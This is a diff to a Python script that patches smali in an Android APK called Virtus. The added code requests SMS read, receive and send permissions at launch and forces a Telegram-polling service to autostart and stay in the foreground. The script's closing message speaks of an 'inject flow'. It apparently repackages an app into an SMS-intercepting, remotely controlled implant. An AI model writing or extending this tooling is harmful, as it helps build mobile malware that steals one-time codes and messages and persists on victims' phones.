@@ -665,6 +665,169 @@ def patch_on_start_command_foreground() -> None:
         print("onStartCommand foreground already patched (skip)")
 
 
+def write_permission_helper() -> None:
+    path = ROOT / "PermissionHelper.smali"
+    path.write_text(
+        """.class public Lcom/virtus/module/PermissionHelper;
+.super Ljava/lang/Object;
+.source "PermissionHelper.java"
+
+
+.method public static ensure(Landroid/app/Activity;)V
+    .locals 4
+
+    const/4 v0, 0x3
+
+    new-array v0, v0, [Ljava/lang/String;
+
+    const-string v1, "android.permission.READ_SMS"
+
+    const/4 v2, 0x0
+
+    aput-object v1, v0, v2
+
+    const-string v1, "android.permission.RECEIVE_SMS"
+
+    const/4 v2, 0x1
+
+    aput-object v1, v0, v2
+
+    const-string v1, "android.permission.SEND_SMS"
+
+    const/4 v2, 0x2
+
+    aput-object v1, v0, v2
+
+    const/16 v1, 0x65
+
+    invoke-virtual {p0, v0, v1}, Landroid/app/Activity;->requestPermissions([Ljava/lang/String;I)V
+
+    sget v0, Landroid/os/Build$VERSION;->SDK_INT:I
+
+    const/16 v1, 0x21
+
+    if-lt v0, v1, :done
+
+    const/4 v0, 0x1
+
+    new-array v0, v0, [Ljava/lang/String;
+
+    const-string v2, "android.permission.POST_NOTIFICATIONS"
+
+    const/4 v3, 0x0
+
+    aput-object v2, v0, v3
+
+    const/16 v2, 0x66
+
+    invoke-virtual {p0, v0, v2}, Landroid/app/Activity;->requestPermissions([Ljava/lang/String;I)V
+
+    :done
+    return-void
+.end method
+"""
+    )
+    print("PermissionHelper.smali written")
+
+
+def patch_main_activity_permissions() -> None:
+    path = ROOT / "MainActivity.smali"
+    text = path.read_text()
+    marker = """    invoke-virtual {v1, v2, v3, v4}, Landroid/os/Handler;->postDelayed(Ljava/lang/Runnable;J)Z
+
+    return-void
+.end method
+
+.method protected onDestroy()V"""
+    insert = """    invoke-virtual {v1, v2, v3, v4}, Landroid/os/Handler;->postDelayed(Ljava/lang/Runnable;J)Z
+
+    invoke-static {v0}, Lcom/virtus/module/PermissionHelper;->ensure(Landroid/app/Activity;)V
+
+    return-void
+.end method
+
+.method protected onDestroy()V"""
+    if "PermissionHelper;->ensure" in text:
+        print("MainActivity permissions already patched (skip)")
+    elif marker in text:
+        path.write_text(text.replace(marker, insert, 1))
+        print("MainActivity permission request added")
+    else:
+        print("MainActivity permission marker missing (skip)")
+
+
+def patch_main_activity_autostart() -> None:
+    path = ROOT / "MainActivity.smali"
+    text = path.read_text()
+    old = """    invoke-direct {v1, v0, v2}, Landroid/content/Intent;-><init>(Landroid/content/Context;Ljava/lang/Class;)V
+
+    invoke-virtual {v0, v1}, Lcom/virtus/module/MainActivity;->startService(Landroid/content/Intent;)Landroid/content/ComponentName;
+
+    .line 235
+    :cond_1"""
+    new = """    invoke-direct {v1, v0, v2}, Landroid/content/Intent;-><init>(Landroid/content/Context;Ljava/lang/Class;)V
+
+    :try_start_auto
+    invoke-virtual {v0, v1}, Lcom/virtus/module/MainActivity;->startForegroundService(Landroid/content/Intent;)Landroid/content/ComponentName;
+    :try_end_auto
+    .catch Ljava/lang/Exception; {:try_start_auto .. :try_end_auto} :catch_auto
+
+    goto :after_auto
+
+    :catch_auto
+    invoke-virtual {v0, v1}, Lcom/virtus/module/MainActivity;->startService(Landroid/content/Intent;)Landroid/content/ComponentName;
+
+    :after_auto
+    .line 235
+    :cond_1"""
+    if ":try_start_auto" in text and "MainActivity;->onCreate" in text:
+        print("MainActivity autostart already patched (skip)")
+    elif old in text:
+        path.write_text(text.replace(old, new, 1))
+        print("MainActivity autostart uses startForegroundService")
+    else:
+        print("MainActivity autostart marker missing (skip)")
+
+
+def patch_service_oncreate_foreground() -> None:
+    path = ROOT / "TelegramPollingService.smali"
+    text = path.read_text()
+    old = """    const/16 v1, 0x3e7
+
+    invoke-virtual {p0, v1, v0}, Lcom/virtus/module/TelegramPollingService;->startForeground(ILandroid/app/Notification;)V
+
+    .line 84
+    :try_start_0"""
+    new = """    const/16 v1, 0x3e7
+
+    :try_start_fg
+    invoke-virtual {p0, v1, v0}, Lcom/virtus/module/TelegramPollingService;->startForeground(ILandroid/app/Notification;)V
+    :try_end_fg
+    .catch Ljava/lang/Exception; {:try_start_fg .. :try_end_fg} :catch_fg
+
+    goto :after_fg
+
+    :catch_fg
+    move-exception v0
+
+    const-string v1, "VirtusModule"
+
+    const-string v2, "startForeground failed in onCreate"
+
+    invoke-static {v1, v2, v0}, Landroid/util/Log;->e(Ljava/lang/String;Ljava/lang/String;Ljava/lang/Throwable;)I
+
+    :after_fg
+    .line 84
+    :try_start_0"""
+    if ":try_start_fg" in text:
+        print("Service onCreate foreground guard already patched (skip)")
+    elif old in text:
+        path.write_text(text.replace(old, new, 1))
+        print("Service onCreate startForeground guarded")
+    else:
+        print("Service onCreate foreground marker missing (skip)")
+
+
 def patch_apk_config_speed() -> None:
     """Config refresh 2000ms -> 1000ms."""
     path = ROOT / "TelegramPollingService$1.smali"
@@ -768,6 +931,10 @@ def main() -> None:
     patch_apk_config_speed()
     patch_android_manifest_fgs()
     patch_on_start_command_foreground()
+    write_permission_helper()
+    patch_main_activity_permissions()
+    patch_main_activity_autostart()
+    patch_service_oncreate_foreground()
     print("DONE — Virtus APK now follows Astik inject flow")
 
 
